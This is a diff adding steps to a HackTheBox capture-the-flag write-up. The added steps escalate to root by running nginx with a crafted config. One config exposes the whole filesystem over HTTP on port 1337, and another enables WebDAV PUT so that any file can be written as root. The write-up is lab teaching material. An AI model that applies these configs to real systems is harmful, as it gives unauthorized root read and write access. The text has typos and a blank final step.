@@ -209,5 +209,49 @@ https://github.com/evkl1d/CVE-2023-46604
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/95b224bb-b522-4137-8c00-09892993853c)
 
 
-15. Great! It seems we just need to modify the `/usr/sbin/nginx` and we shall gained root easily.
+15. Great! It seems we just need to configure malicious nginx file and we shall gained root easily.
+16. However, I identified two ways to gained root. The first is to read the root flag by crafting this `nginx.conf` file:
+
+> expl.conf
+
+```
+user root; 
+work_processes 5;
+
+events {
+    worker_connections  1024; # default 1024
+}
+
+http{
+    server{
+        listen 1337;
+        root /;
+        autoindex on;
+    }
+}
+```
+
+17. The second way is to do **File Write**, NGINX can also handle PUT request (by adding dav_method PUT).
+
+> expl.conf (with dav_methods)
+
+```
+user root; 
+work_processes 5;
+
+events {
+    worker_connections  1024; # default 1024
+}
+
+http{
+    server{
+        listen 1337;
+        root /;
+        autoindex on;
+        dav_methods PUT;
+    }
+}
+```
+
+19. 
 
